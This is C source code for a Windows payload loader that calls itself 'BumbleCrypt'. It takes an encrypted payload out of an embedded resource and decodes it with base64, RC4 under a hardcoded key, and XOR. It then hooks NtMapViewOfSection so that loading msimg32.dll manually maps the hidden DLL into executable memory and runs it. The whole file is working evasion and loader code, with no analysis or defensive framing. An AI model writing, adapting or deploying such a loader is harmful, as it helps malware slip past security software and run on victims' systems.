#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include "resource.h"
#include "manualMap.h"
#include "MinHook.h"
#include "b64.h"

#pragma comment(lib,"Crypt32.lib")
#pragma comment(lib, "libMinHook.x64.lib") 

#define N 256

DWORD length_bin;
typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef NTSTATUS(NTAPI* NtCreateSectionAlias)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
typedef NTSTATUS(NTAPI* NtMapViewOfSectionAlias) (HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

NtMapViewOfSectionAlias fNtMapViewTarget = NULL;
NtMapViewOfSectionAlias fNtMapViewTram = NULL;
LPVOID pBuf_s;

// Hook Function

NTSTATUS __stdcall HFunc(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {

    //unhook

    NtMapViewOfSectionAlias fNtMapView = (NtMapViewOfSectionAlias)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));

    DWORD oldProtect;
    VirtualProtect(fNtMapView, 8, 0x40, &oldProtect);
    memmove(fNtMapView, fNtMapViewTram, 8);
    VirtualProtect(fNtMapView, 8, oldProtect, &oldProtect);

    // Create Section

    NtCreateSectionAlias fNtCreateSection = (NtCreateSectionAlias)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
    HANDLE sechan = NULL;
    //printf("\n%d", length_bin);
    SIZE_T size = length_bin;
    LARGE_INTEGER sectionSize = { size * sizeof(int) };

    fNtCreateSection(&sechan, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);

    SectionHandle = sechan;
    Win32Protect = 0x40;
    AllocationType = 0x0;
    NTSTATUS output = fNtMapView(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);

    // Manual Map DLL
    //printf("Address to mz %x", pBuf_s);
    
    MapIt((BYTE*)pBuf_s, length_bin, (PVOID*)*BaseAddress);

    //return NTSTATUS Success output to LoadLibrary which then executes the entrypoint of the DLL

    return output;

}



// Decryption Functions

char key[9] = { 0x65, 0x76, 0x69, 0x6c, 0x63, 0x6f, 0x72, 0x70 };

void swap(unsigned char* a, unsigned char* b) {
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int KSA(char* key, unsigned char* S) {

    int len = strlen(key);
    int j = 0;

    for (int i = 0; i < N; i++)
        S[i] = i;

    for (int i = 0; i < N; i++) {
        j = (j + S[i] + key[i % len]) % N;

        swap(&S[i], &S[j]);
    }

    return 0;
}

int PRGA(unsigned char* S, char* plaintext, unsigned char* ciphertext, size_t length) {

    int i = 0;
    int j = 0;

    for (size_t n = 0, len = length; n < len; n++) {
        i = (i + 1) % N;
        j = (j + S[i]) % N;

        swap(&S[i], &S[j]);
        int rnd = S[(S[i] + S[j]) % N];

        ciphertext[n] = rnd ^ plaintext[n];

    }

    return 0;
}

int Arc(char* key, char* plaintext, unsigned char* ciphertext, char* len_buf) {

    unsigned char S[N];
    KSA(key, S);

    PRGA(S, plaintext, ciphertext, (size_t)len_buf);

    return 0;
}

char* FindRes() {

    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResourceW(hModule, MAKEINTRESOURCE(PAY_EMBED), MAKEINTRESOURCE(RT_RCDATA));
    DWORD lasterror = GetLastError();
    HGLOBAL hMemory = LoadResource(hModule, hResource);
    DWORD dwSize = SizeofResource(hModule, hResource);
    LPVOID lpAddress = LockResource(hMemory);

    char* bytes = new char[dwSize];
    memcpy(bytes, lpAddress, dwSize);
    return bytes;



}

char* xorer(char* data, char* key, int dataLen, int keyLen) {
    char* output = (char*)malloc(sizeof(char) * dataLen);

    for (int i = 0; i < dataLen; ++i) {
        output[i] = data[i] ^ key[i % keyLen];
    }

    return output;
}

int InitHooker() {

    
    if (MH_Initialize() != MH_OK)
    {
        return 0;
    }

    if (MH_CreateHookApiEx(
        L"ntdll", "NtMapViewOfSection", &HFunc, (LPVOID*)&fNtMapViewTram, (LPVOID*)fNtMapViewTarget) != MH_OK)
    {
        return 0;
    }

    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
    {
        return 0;
    }


}

int main(int argc, char* argv[])
{

    printf("\n[+] Initiating BumbleCrypt");

    //Res Decryption

    char* fetch_pay = FindRes();
    printf("\n[+] Resource Loaded ");

    // b64 Decode

    char* buffer_decode = (char*)calloc(strlen(fetch_pay), sizeof(int));
    size_t len_buffer;
    
    unsigned char* dec = b64_decode_ex(fetch_pay, strlen(fetch_pay), &len_buffer);
    memcpy(buffer_decode, dec, len_buffer);
    free(fetch_pay);
    free(dec);

    char* enc_data = buffer_decode;
    unsigned char* ciphertext = (unsigned char*)calloc(len_buffer, sizeof(char));

    // ArC4 Decrypt

    Arc(key, enc_data, ciphertext, (char*)len_buffer);

    // Heap Allocations

    HANDLE hHeap = GetProcessHeap();
    LPVOID pBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, len_buffer);

    memmove(pBuf, ciphertext, len_buffer);

    HANDLE hHeap_f = GetProcessHeap();
    LPVOID pBuf_f = HeapAlloc(hHeap_f, HEAP_ZERO_MEMORY, len_buffer);

    memmove(pBuf_f, pBuf, len_buffer); 


    HANDLE hHeap_s = GetProcessHeap();
    pBuf_s = HeapAlloc(hHeap_s, HEAP_ZERO_MEMORY, len_buffer);

    char xer[1] = { 0x65 };

    memmove(pBuf_s, xorer((char*)pBuf_f, xer, len_buffer, sizeof(xer)), len_buffer);
    length_bin = len_buffer;

    printf("\n[+] Payload decrypted and allocated");

    // Hooking Routine

    InitHooker();
    printf("\n[+] Hook Initiated");

    printf("\n[+] Loading msimg32.dll");
    HMODULE hinstLib_h = LoadLibraryW(L"msimg32.dll");
    FARPROC LoadDllAdr = GetProcAddress(hinstLib_h, "CallPath");
    printf("\n[+] Executing Payload");
    LoadDllAdr();
    MH_DisableHook(MH_ALL_HOOKS);


    // Heap Free

    BOOL HFree = HeapFree(hHeap, 0, pBuf);
    BOOL HFree_f = HeapFree(hHeap, 0, pBuf_f);
    BOOL HFree_s = HeapFree(hHeap, 0, pBuf_s);


    if (MH_Uninitialize() != MH_OK)
    {
        return 1;
    }

    getchar();
}


